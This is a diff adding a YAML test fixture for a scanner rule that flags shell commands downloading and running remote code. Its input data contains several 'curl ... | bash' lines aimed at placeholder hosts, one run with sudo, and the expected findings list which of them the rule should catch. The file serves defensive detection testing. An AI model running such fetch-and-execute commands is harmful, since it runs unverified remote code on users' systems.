@@ -1,0 +1,22 @@
+# Copyright 2020-2023 VMware, Inc.
+# SPDX-License-Identifier: BSD-2-Clause
+
+name: curl_bash
+description: Test to check basic functionality of the curl bash behavioral rule
+config:
+  input_data: |
+    this is a block of text
+    curl http://something.local | bash
+    curl http://something.local | sudo bash
+    curl http://anotherthing > test.file
+    curl https://something.local | bash
+  expected_findings:
+    - source: curl_bash
+      finding_data: curl http://something.local | bash
+    - source: curl_bash
+      finding_data: curl https://something.local | bash
+    - source: curl_bash
+      finding_data: curl http://something.local | sudo bash
+    - source: curl_bash
+      finding_data: curl http://anotherthing > test.file
+      false_positive: true
